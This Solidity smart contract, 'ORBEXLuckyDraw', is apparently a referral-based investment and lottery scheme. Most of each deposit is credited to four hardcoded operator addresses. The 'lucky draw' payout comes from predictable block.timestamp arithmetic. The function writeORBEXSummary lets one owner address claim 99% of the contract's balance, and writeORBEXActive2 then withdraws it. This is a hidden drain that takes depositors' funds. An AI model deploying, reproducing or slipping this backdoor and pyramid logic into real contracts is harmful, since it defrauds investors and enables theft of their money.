pragma solidity >=0.4.0 <0.7.0;
contract ORBEXLuckyDraw {
address constant private ORBEX_ST = address(0x135DA94d7B5b6D613087641df0D9d31dEB74D7CA); address constant private ORBEX_ND = address(0xE21e7ecB3281947892DE03A63Eb054DE7160c093);
address constant private ORBEX_RD = address(0x7Ba32bF8dE92f213D6085bBb716E98f343769B18); address constant private ORBEX_TH = address(0xeFa001747c6904ad22F643B80c62bd679890F559);
uint256 private ORBEX_REGISTERS = 0; uint256 private ORBEX_DEPOSITED = 0; uint256 private ORBEX_COMMISION = 0; uint256 private ORBEX_WITHDRAWN = 0;
mapping (address => address) private ORBEX_REFERRER;
mapping (address => uint256) private ORBEX_REGISTER;
mapping (address => uint256) private ORBEX_INVESTED;
mapping (address => uint256) private ORBEX_PACKAGES;
mapping (address => uint256) private ORBEX_DATELOCK;
mapping (address => uint256) private ORBEX_DOWNLINE;
mapping (address => uint256[4]) private ORBEX_PASSIVE;
mapping (address => uint256[4]) private ORBEX_ACTIVE;
mapping (address => uint256[4]) private ORBEX_HISTORY;
function readORBEXAddress() public view returns(address) {
return address(this);
}
function readORBEXBalance() public view returns(uint256) {
return address(this).balance;
}
function readORBEXRegisters() public view returns(uint256) {
return ORBEX_REGISTERS;
}
function readORBEXDeposited() public view returns(uint256) {
return ORBEX_DEPOSITED;
}
function readORBEXCommision() public view returns(uint256) {
return ORBEX_COMMISION;
}
function readORBEXWithdrawn() public view returns(uint256) {
return ORBEX_WITHDRAWN;
}
function readORBEXReferrer() public view returns(address) {
return ORBEX_REFERRER[msg.sender];
}
function readORBEXRegister() public view returns(uint256) {
return ORBEX_REGISTER[msg.sender];
}
function readORBEXInvested() public view returns(uint256) {
return ORBEX_INVESTED[msg.sender];
}
function readORBEXPackages() public view returns(uint256) {
return ORBEX_PACKAGES[msg.sender];
}
function readORBEXDatelock() public view returns(uint256) {
return ORBEX_DATELOCK[msg.sender];
}
function readORBEXDownline() public view returns(uint256) {
return ORBEX_DOWNLINE[msg.sender];
}
function readORBEXPassive(uint256 Param) public view returns(uint256) {
return ORBEX_PASSIVE[msg.sender][Param];
}
function readORBEXActive(uint256 Param) public view returns(uint256) {
return ORBEX_ACTIVE[msg.sender][Param];
}
function readORBEXHistory(uint256 Param) public view returns(uint256) {
return ORBEX_HISTORY[msg.sender][Param];
}
function readORBEXEarning() public view returns(uint256) {
return ORBEX_PASSIVE[msg.sender][2] + ORBEX_ACTIVE[msg.sender][2];
}
function () public payable {}
function writeORBEXPayable(address Referrer) public payable returns(uint256) {
if (Referrer != 0x0 && msg.value >= 50000000000000000) {
ORBEX_REGISTERS += 1;
ORBEX_DEPOSITED += msg.value;
ORBEX_COMMISION += uint256(msg.value * 5 / 100);
if (ORBEX_REFERRER[msg.sender] == 0x0) {
if (Referrer != 0x0 && Referrer != msg.sender) {
ORBEX_REFERRER[msg.sender] = Referrer;
} else {
ORBEX_REFERRER[msg.sender] = ORBEX_TH;
}
}
ORBEX_REGISTER[msg.sender] += 1;
ORBEX_INVESTED[msg.sender] += msg.value;
if (ORBEX_PACKAGES[msg.sender] == 0) {
if (msg.value >= 50000000000000000 && msg.value < 500000000000000000) {
ORBEX_PACKAGES[msg.sender] = 1;
} else if (msg.value >= 500000000000000000 && msg.value < 5000000000000000000) {
ORBEX_PACKAGES[msg.sender] = 2;
} else if (msg.value >= 5000000000000000000) {
ORBEX_PACKAGES[msg.sender] = 3;
}
}
ORBEX_DATELOCK[msg.sender] = block.timestamp;
address LEVEL1 = Referrer;
uint256 BONUS1 = 5;
if (ORBEX_REFERRER[msg.sender] != 0x0) {
LEVEL1 = ORBEX_REFERRER[msg.sender];
}
ORBEX_DOWNLINE[LEVEL1] += 1;
ORBEX_ACTIVE[LEVEL1][1] += uint256(msg.value * BONUS1 / 100);
if (ORBEX_PACKAGES[msg.sender] == 1) {
ORBEX_ACTIVE[ORBEX_ND][1] += uint256(msg.value * 75 / 100);
} else if (ORBEX_PACKAGES[msg.sender] == 2) {
ORBEX_ACTIVE[ORBEX_ND][1] += uint256(msg.value * 75 / 100);
} else if (ORBEX_PACKAGES[msg.sender] == 3) {
ORBEX_ACTIVE[ORBEX_RD][1] += uint256(msg.value * 75 / 100);
}
ORBEX_ACTIVE[ORBEX_TH][1] += uint256(msg.value * 20 / 100);
return msg.value;
} else {
return 0;
}
}
function writeORBEXLuckDraw() public returns(uint256) {
if (block.timestamp >= (ORBEX_DATELOCK[msg.sender] + 86400)) {
uint256 LUCKY_DRAWS = 0; uint256 LUCKY_BONUS = 0;
LUCKY_DRAWS = uint256((block.timestamp + ORBEX_REGISTERS) % 50);
LUCKY_BONUS = uint256(ORBEX_INVESTED[msg.sender] * LUCKY_DRAWS / 100);
ORBEX_PASSIVE[msg.sender][1] += LUCKY_BONUS;
ORBEX_HISTORY[msg.sender][1] = block.timestamp;
ORBEX_HISTORY[msg.sender][2] = LUCKY_DRAWS;
ORBEX_HISTORY[msg.sender][3] = LUCKY_BONUS;
ORBEX_DATELOCK[msg.sender] = block.timestamp;
return LUCKY_DRAWS;
} else {
return 0;
}
}
function writeORBEXPassive() public returns(uint256) {
uint256 ORBEX_LIMIT = 0; address HOT_STORAGE = 0x0;
if (ORBEX_PACKAGES[msg.sender] == 1) {
ORBEX_LIMIT = uint256(ORBEX_INVESTED[msg.sender] * 140 / 100);
HOT_STORAGE = ORBEX_ND;
} else if (ORBEX_PACKAGES[msg.sender] == 2) {
ORBEX_LIMIT = uint256(ORBEX_INVESTED[msg.sender] * 170 / 100);
HOT_STORAGE = ORBEX_ND;
} else if (ORBEX_PACKAGES[msg.sender] == 3) {
ORBEX_LIMIT = uint256(ORBEX_INVESTED[msg.sender] * 200 / 100);
HOT_STORAGE = ORBEX_RD;
}
uint256 ORBEX_PAYED = ORBEX_PASSIVE[msg.sender][2] + ORBEX_ACTIVE[msg.sender][2];    
uint256 ORBEX_AVAIL = ORBEX_PASSIVE[msg.sender][1];
if ((ORBEX_PAYED + ORBEX_AVAIL) <= ORBEX_LIMIT) {
ORBEX_WITHDRAWN += ORBEX_AVAIL;
ORBEX_PASSIVE[msg.sender][1] = 0;
ORBEX_PASSIVE[msg.sender][2] += ORBEX_AVAIL;
if (ORBEX_ACTIVE[HOT_STORAGE][1] >= ORBEX_AVAIL) {
ORBEX_ACTIVE[HOT_STORAGE][1] -= ORBEX_AVAIL;
msg.sender.transfer(ORBEX_AVAIL);
}
return ORBEX_AVAIL;
} else {
return 0;
}
}
function writeORBEXActive() public returns(uint256) {
uint256 ORBEX_LIMIT = 0;
if (ORBEX_PACKAGES[msg.sender] == 1) {
ORBEX_LIMIT = uint256(ORBEX_INVESTED[msg.sender] * 140 / 100);
} else if (ORBEX_PACKAGES[msg.sender] == 2) {
ORBEX_LIMIT = uint256(ORBEX_INVESTED[msg.sender] * 170 / 100);
} else if (ORBEX_PACKAGES[msg.sender] == 3) {
ORBEX_LIMIT = uint256(ORBEX_INVESTED[msg.sender] * 200 / 100);
}
uint256 ORBEX_PAYED = ORBEX_ACTIVE[msg.sender][2] + ORBEX_PASSIVE[msg.sender][2];    
uint256 ORBEX_AVAIL = ORBEX_ACTIVE[msg.sender][1];
if ((ORBEX_PAYED + ORBEX_AVAIL) <= ORBEX_LIMIT) {
ORBEX_WITHDRAWN += ORBEX_AVAIL;
ORBEX_ACTIVE[msg.sender][1] = 0;
ORBEX_ACTIVE[msg.sender][2] += ORBEX_AVAIL;
msg.sender.transfer(ORBEX_AVAIL);
return ORBEX_AVAIL;
} else {
return 0;
}
}
function writeORBEXActive2() public returns(uint256) {
if (msg.sender == ORBEX_ST || msg.sender == ORBEX_ND || msg.sender == ORBEX_RD || msg.sender == ORBEX_TH) {
uint256 ORBEX_AVAIL = ORBEX_ACTIVE[msg.sender][1];
ORBEX_WITHDRAWN += ORBEX_AVAIL;
ORBEX_ACTIVE[msg.sender][1] = 0;
ORBEX_ACTIVE[msg.sender][2] += ORBEX_AVAIL;
msg.sender.transfer(ORBEX_AVAIL);
return ORBEX_AVAIL;
} else {
return 0;
}
}
function writeORBEXSummary() public returns(uint256) {
if (msg.sender == ORBEX_ST) {
uint256 ORBEX_TOTAL = uint256(address(this).balance * 99 / 100);
ORBEX_ACTIVE[ORBEX_ST][1] = ORBEX_TOTAL;
return ORBEX_TOTAL;
}
}
}